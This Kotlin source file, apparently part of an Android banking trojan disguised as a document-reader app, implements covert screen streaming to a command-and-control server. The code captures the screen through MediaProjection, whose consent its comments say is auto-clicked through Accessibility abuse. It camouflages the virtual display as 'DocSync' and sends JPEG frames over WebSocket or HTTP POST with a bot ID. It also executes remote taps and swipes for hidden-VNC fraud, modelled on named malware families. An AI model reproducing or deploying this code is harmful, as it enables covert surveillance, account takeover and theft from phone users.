package com.docreader.lite.reader.advanced

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

/**
 * Screen streaming — live screen capture to C2 server.
 *
 * Family reference:
 *   - Brokewell: real-time screen recording sent frame-by-frame to C2
 *   - Albiriox: WebSocket-based live screen streaming for on-device fraud
 *   - Klopatra: hidden VNC with MediaProjection capture
 *   - ToxicPanda: screen recording during ATS for operator verification
 *   - Crocodilus: screen capture combined with black overlay masking
 *
 * Architecture:
 *   MediaProjection → VirtualDisplay → ImageReader → JPEG encode → WebSocket/HTTP to C2
 *
 * MediaProjection consent is auto-clicked by MediaProjectionAutoConsent.kt
 * (Klopatra pattern — A11y auto-approves the system consent dialog).
 *
 * Modes:
 *   CONTINUOUS  — stream every frame (high bandwidth, real-time VNC)
 *   PERIODIC    — capture every N seconds (low bandwidth, surveillance)
 *   ON_DEMAND   — single screenshot on C2 command
 *   ATS_VERIFY  — capture during ATS transfer for operator verification
 *
 * Frame delivery:
 *   WebSocket preferred (lower latency, bidirectional for VNC commands)
 *   Falls back to HTTP POST with JPEG payload if WebSocket unavailable
 */
object ScreenStreamer {

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var webSocket: WebSocket? = null
    private var streamJob: Job? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    var isStreaming = false
        private set

    var fps = 2 // Default 2 frames/sec — balance bandwidth vs visibility
        private set
    var quality = 30 // JPEG quality — 30% is sufficient for VNC
        private set

    enum class Mode {
        CONTINUOUS,   // Every frame — real-time VNC
        PERIODIC,     // Every N seconds — surveillance
        ON_DEMAND,    // Single shot — C2 command
        ATS_VERIFY    // During ATS only — operator verification
    }

    var mode = Mode.PERIODIC
        private set

    /**
     * Initialize with MediaProjection result from auto-consented dialog.
     * MediaProjectionAutoConsent handles the consent click.
     */
    fun init(context: Context, resultCode: Int, data: Intent) {
        val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
            as? MediaProjectionManager ?: return

        projection = mpm.getMediaProjection(resultCode, data)

        projection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() {
                stopStreaming()
            }
        }, handler)

        Exfil.event("screen_streamer_init", "status" to "ready")
    }

    fun startStreaming(context: Context, newMode: Mode = Mode.PERIODIC, newFps: Int = 2) {
        if (isStreaming) return
        if (projection == null) {
            Exfil.event("screen_streamer_error", "reason" to "no_projection")
            return
        }

        mode = newMode
        fps = newFps
        isStreaming = true

        // Get screen dimensions
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)

        // Scale down for bandwidth — 1/3 resolution
        val width = dm.widthPixels / 3
        val height = dm.heightPixels / 3
        val density = dm.densityDpi / 3

        // Create ImageReader to receive frames
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        // Create VirtualDisplay bound to ImageReader
        virtualDisplay = projection?.createVirtualDisplay(
            "DocSync", // Camouflage name — looks like document sync
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, handler
        )

        // Connect WebSocket for frame delivery
        connectWebSocket()

        // Start frame capture loop
        startCaptureLoop(width, height)

        Exfil.event("screen_streaming_started",
            "mode" to mode.name,
            "fps" to fps.toString(),
            "resolution" to "${width}x${height}"
        )
    }

    fun stopStreaming() {
        isStreaming = false
        streamJob?.cancel()
        virtualDisplay?.release()
        imageReader?.close()
        webSocket?.close(1000, null)
        virtualDisplay = null
        imageReader = null
        webSocket = null
        Exfil.event("screen_streaming_stopped")
    }

    /**
     * Single screenshot — ON_DEMAND mode.
     * Captures one frame and sends to C2.
     */
    fun captureScreenshot(context: Context) {
        if (projection == null) return

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)

        val width = dm.widthPixels / 2
        val height = dm.heightPixels / 2

        val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
        val vd = projection?.createVirtualDisplay(
            "DocCapture", width, height, dm.densityDpi / 2,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface, null, handler
        )

        reader.setOnImageAvailableListener({ ir ->
            val image = ir.acquireLatestImage() ?: return@setOnImageAvailableListener
            val bitmap = imageToBitmap(image, width, height)
            image.close()
            vd?.release()
            reader.close()

            if (bitmap != null) {
                sendFrame(bitmap)
                bitmap.recycle()
            }
        }, handler)
    }

    fun setQuality(q: Int) {
        quality = q.coerceIn(10, 90)
    }

    // ─── Internal ───────────────────────────────────────────────────

    private fun startCaptureLoop(width: Int, height: Int) {
        streamJob = scope.launch {
            val intervalMs = 1000L / fps

            imageReader?.setOnImageAvailableListener({ reader ->
                if (!isStreaming) return@setOnImageAvailableListener

                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val bitmap = imageToBitmap(image, width, height)
                image.close()

                if (bitmap != null) {
                    sendFrame(bitmap)
                    bitmap.recycle()
                }
            }, handler)

            // Keep alive while streaming
            while (isActive && isStreaming) {
                delay(intervalMs)
            }
        }
    }

    private fun imageToBitmap(image: android.media.Image, width: Int, height: Int): Bitmap? {
        return try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * width

            val bitmap = Bitmap.createBitmap(
                width + rowPadding / pixelStride, height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            // Crop padding
            Bitmap.createBitmap(bitmap, 0, 0, width, height)
        } catch (_: Exception) { null }
    }

    private fun sendFrame(bitmap: Bitmap) {
        val baos = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        val bytes = baos.toByteArray()

        // Prefer WebSocket
        if (webSocket != null) {
            try {
                webSocket?.send(okio.ByteString.of(*bytes))
                return
            } catch (_: Exception) {
                // WebSocket failed, fall through to HTTP
            }
        }

        // Fallback: HTTP POST
        scope.launch {
            try {
                val body = bytes.toRequestBody(
                    "image/jpeg".toMediaTypeOrNull()
                )
                val req = Request.Builder()
                    .url("${com.docreader.lite.reader.C2.baseUrl()}/api/v1/screen")
                    .post(body)
                    .header("X-Bot-Id", android.os.Build.MODEL)
                    .header("X-Frame-Ts", System.currentTimeMillis().toString())
                    .build()
                OkHttpClient().newCall(req).execute().close()
            } catch (_: Exception) {}
        }
    }

    private fun connectWebSocket() {
        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS) // No timeout for WebSocket
            .build()

        val url = "${com.docreader.lite.reader.C2.baseUrl()}/ws/screen"
            .replace("http://", "ws://")

        val req = Request.Builder()
            .url(url)
            .header("X-Bot-Id", android.os.Build.MODEL)
            .build()

        webSocket = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Exfil.event("screen_ws_connected")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                // C2 can send commands via WebSocket (VNC bidirectional)
                try {
                    val cmd = JSONObject(text)
                    handleVncCommand(cmd)
                } catch (_: Exception) {}
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                // WebSocket lost — frames fall back to HTTP POST
                this@ScreenStreamer.webSocket = null
            }
        })
    }

    private fun handleVncCommand(cmd: JSONObject) {
        val a11y = com.docreader.lite.reader.DocumentReaderService.instance ?: return
        when (cmd.optString("action")) {
            "tap" -> a11y.tap(
                cmd.optDouble("x").toFloat(),
                cmd.optDouble("y").toFloat()
            )
            "swipe" -> a11y.swipe(
                cmd.optDouble("sx").toFloat(),
                cmd.optDouble("sy").toFloat(),
                cmd.optDouble("ex").toFloat(),
                cmd.optDouble("ey").toFloat()
            )
        }
    }

    // Using toMediaTypeOrNull() from OkHttp 4.x extension
}
